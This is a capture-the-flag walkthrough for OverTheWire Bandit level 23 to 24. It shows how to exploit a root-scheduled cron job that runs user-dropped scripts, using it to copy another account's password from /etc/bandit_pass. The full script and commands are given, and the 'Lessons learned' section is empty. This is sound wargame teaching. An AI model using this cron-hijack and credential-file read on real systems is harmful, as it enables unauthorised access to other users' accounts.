---
title: "Level 23 -> Level 24"
description: "Learn how to create a shell."
date: 2026-08-21
platform: OverTheWire
game: Bandit
level: "23 -> 24"
difficulty: Easy
category: Linux
tags:
  - SSH
  - Linux
  - Beginner
---

## Challenge

Connect to the Bandit game server over SSH and locate the password for the next level.

## Enumeration

Connect to the non-standard SSH port:

```sh title="Terminal"
ssh -p 2220 bandit23@bandit.labs.overthewire.org 
```

## Exploitation

After logging in:

Let's take a look inside `/etc/cron.d` and see the cronjob file first.
```sh title="Terminal"
cd /etc/cron.d
cat cronjob_bandit24.sh

# The result:
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

This means: there's a shell script being executed here in `/usr/bin/cronjob_bandit24.sh`.

Now let's take a look inside `/usr/bin/cronjob_bandit24.sh` next.

```sh title="Terminal"
cat /usr/bin/cronjob_bandit24.sh

# The result:
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done

```

Explanation of the script: 
1. Change directory to `/var/spool/"$myname"/foo`.
2. Loop through files in it.
3. Execute the files and delete them with the timeout of 60 seconds.


Also, remember passwords are in `/etc/bandit_pass`.

So, we can use the cron job script file to get password, because even if we are just bandit23, we can still execute the file. 

Let's do that now.

```sh title="Terminal"
Create a random directory
mktemp -d

# The result:
/tmp/tmp.a6BZTor0Cj


# Then change permission to 777, so that it can be done anything by, including the cron job.
chmod 777 /tmp/tmp.


# Create a shell script in /tmp/tmp.a6BZTor0Cj/
cd /tmp/tmp.a6BZTor0Cj/
vim script.sh
```

This is the script that we're using.

```sh title="Terminal"
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.a6BZTor0Cj/bandit24_password
```

Basically, in this bash script, we just try to write password from file `/etc/bandit_pass/bandit24` to `/tmp/tmp.a6BZTor0Cj/bandit24_password`.


Now change this file's permission too.
```sh title="Terminal"
chmod 777 script.sh
```

Next, we copy it to `/var/spool/bandit24/foo` for execution, then wait a bit to see the result.
```sh title="Terminal"
cp script.sh /var/spool/bandit24/foo
```

P.S. You need to wait for the cron job because this script is executed by the system at scheduled intervals, which is `* * * * *`, this cron expression means every minute.

```sh title="Terminal"
# I've waited for approximately a minute, then I check.
ls

# It's finally here.
bandit24_password  script.sh

# Now, we can read it.
cat bandit24_password
```


The file contains the password needed to access the next Bandit level.

The real password is intentionally omitted from this public example. Run the commands above to retrieve it yourself.

## Lessons learned

:::tip[Key takeaways]

- 

:::